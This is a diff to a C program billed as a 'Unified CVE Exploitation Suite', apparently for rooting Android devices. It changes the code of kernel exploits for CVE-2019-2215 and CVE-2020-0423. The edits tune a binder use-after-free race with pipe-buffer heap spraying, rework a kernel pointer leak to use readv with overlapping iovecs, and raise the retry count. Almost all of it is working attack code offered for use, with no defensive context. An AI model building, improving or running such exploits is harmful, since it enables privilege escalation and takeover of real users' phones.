@@ -40,7 +40,7 @@ extern int setfsgid(gid_t);
 #define DUMP_MAX_SIZE (20 * 1024 * 1024)
 #define KGSL_DEVICE "/dev/kgsl-3d0"
 #define SPRAY_PIPE_COUNT 64
-#define ATTEMPTS 6
+#define ATTEMPTS 8
 
 /* KGSL ioctls from msm_kgsl.h */
 #define KGSL_IOC_TYPE 0x09
@@ -318,7 +318,9 @@ static int test_cve_2020_0423(void) {
     return -1;
 }
 
-/* CVE-2019-2215 (legacy) - kept but will likely fail */
+/* ============================================================
+   CVE-2019-2215 Leak with readv and overlapping iovec
+   ============================================================ */
 static int leak_kernel_pointer(int *cred_off_out, int *al_off_out) {
     int pipefd[2], fd, epoll_fd;
     pid_t cpid;
@@ -365,6 +367,7 @@ static int leak_kernel_pointer(int *cred_off_out, int *al_off_out) {
         return -1;
     }
 
+    /* Overlapping iovec for readv */
     memset(iovec_stack, 0, sizeof(iovec_stack));
     iovec_stack[OVERLAP_INDEX].iov_base = aligned;
     iovec_stack[OVERLAP_INDEX].iov_len = PAGE_SIZE;
@@ -386,7 +389,8 @@ static int leak_kernel_pointer(int *cred_off_out, int *al_off_out) {
         _exit(0);
     }
 
-    n = read_with_timeout(pipefd[0], aligned, PAGE_SIZE, TIMEOUT_MS);
+    /* Use readv with overlapping iovec to read pipe buffer */
+    n = readv(pipefd[0], iovec_stack + OVERLAP_INDEX, 2);
     wait(NULL);
 
     close(fd);
@@ -488,7 +492,7 @@ static int setup_kernel_rw(void) {
 }
 
 /* ============================================================
-   CVE-2020-0423 RW with correct spray after free
+   CVE-2020-0423 RW with spray after free (improved timing)
    ============================================================ */
 static int exploit_cve_2020_0423_rw(void) {
     printf("[*] Attempting kernel RW via CVE-2020-0423 UAF (spray after free)...\n");
@@ -514,15 +518,13 @@ static int exploit_cve_2020_0423_rw(void) {
         }
 
         if (pid == 0) {
-            /* Child: trigger UAF after delay */
-            usleep(30000 + (attempt * 5000));
+            usleep(20000 + (attempt * 3000));
             ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
             close(binder_fd);
             close(epoll_fd);
             _exit(0);
         }
 
-        /* Parent: wait for epoll event */
         struct epoll_event events[1];
         int n = epoll_wait(epoll_fd, events, 1, 2000);
         if (n <= 0) {
@@ -533,7 +535,6 @@ static int exploit_cve_2020_0423_rw(void) {
         }
         printf("  [+] epoll event received, spraying pipe buffers...\n");
 
-        /* Now the binder_thread is freed. Create pipes to reuse the freed memory */
         int spray_pipes[SPRAY_PIPE_COUNT][2];
         int i;
         for (i = 0; i < SPRAY_PIPE_COUNT; i++) {
@@ -545,7 +546,6 @@ static int exploit_cve_2020_0423_rw(void) {
                 perror("  fcntl spray");
                 break;
             }
-            /* Write data to allocate pipe buffers */
             char buf[PAGE_SIZE];
             memset(buf, 0x41, sizeof(buf));
             write(spray_pipes[i][1], buf, sizeof(buf));
@@ -560,7 +560,6 @@ static int exploit_cve_2020_0423_rw(void) {
             continue;
         }
 
-        /* Now read from each spray pipe to capture the freed memory content */
         void *leak_buf = mmap_page(0x100000000UL);
         if (!leak_buf) {
             for (int j = 0; j < SPRAY_PIPE_COUNT; j++) {
@@ -639,7 +638,6 @@ static int exploit_cve_2020_0423_rw(void) {
             }
         }
 
-        /* Cleanup */
         for (int j = 0; j < SPRAY_PIPE_COUNT; j++) {
             close(spray_pipes[j][0]);
             close(spray_pipes[j][1]);
@@ -1178,7 +1176,7 @@ int main(void) {
     uint64_t leaked_addr = 0;
 
     printf("==================================================\n");
-    printf("  Unified CVE Exploitation Suite v4.7\n");
+    printf("  Unified CVE Exploitation Suite v4.8\n");
     printf("  (CVE-2019-2215, 2020-0041, 2020-0423, 2019-2023,\n");
     printf("   CVE-2022-25664, CVE-2021-1961,\n");
     printf("   CVE-2023-20938-inspired)\n");
@@ -1197,7 +1195,7 @@ int main(void) {
     printf("\n[PHASE 3] CVE-2020-0423\n");
     test_cve_2020_0423();
 
-    printf("\n[PHASE 4] CVE-2019-2215 (legacy)\n");
+    printf("\n[PHASE 4] CVE-2019-2215 (legacy) with readv\n");
     int cred_off = -1, al_off = -1;
     if (leak_kernel_pointer(&cred_off, &al_off) == 0) {
         cve_2215_ok = 1;
